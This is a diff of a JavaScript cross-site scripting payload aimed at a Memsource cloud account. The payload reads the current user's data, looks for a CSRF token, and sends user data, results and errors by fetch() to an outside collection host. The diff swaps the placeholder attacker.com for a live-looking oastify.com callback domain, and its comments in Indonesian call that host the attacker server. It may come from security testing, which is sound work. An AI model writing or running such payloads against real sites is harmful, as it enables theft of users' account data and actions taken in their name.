@@ -15,7 +15,7 @@ fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
     
     if (!csrfToken) {
         // Fallback: kirim ke server attacker untuk debug
-        fetch('https://attacker.com/xss-log?step=csrf-not-found&data=' + encodeURIComponent(JSON.stringify(userData)));
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-log?step=csrf-not-found&data=' + encodeURIComponent(JSON.stringify(userData)));
         return;
     }
     
@@ -54,13 +54,13 @@ fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
         return response.json().catch(() => ({ status: response.status }));
     })
     .then(result => {
-        fetch('https://attacker.com/xss-success?result=' + encodeURIComponent(JSON.stringify(result)));
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-success?result=' + encodeURIComponent(JSON.stringify(result)));
     })
     .catch(error => {
-        fetch('https://attacker.com/xss-error?message=' + encodeURIComponent(error.message));
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?message=' + encodeURIComponent(error.message));
     });
 })
 .catch(error => {
     // Log error ke attacker server
-    fetch('https://attacker.com/xss-error?step=csrf-fetch&error=' + encodeURIComponent(error.message));
+    fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=csrf-fetch&error=' + encodeURIComponent(error.message));
 });
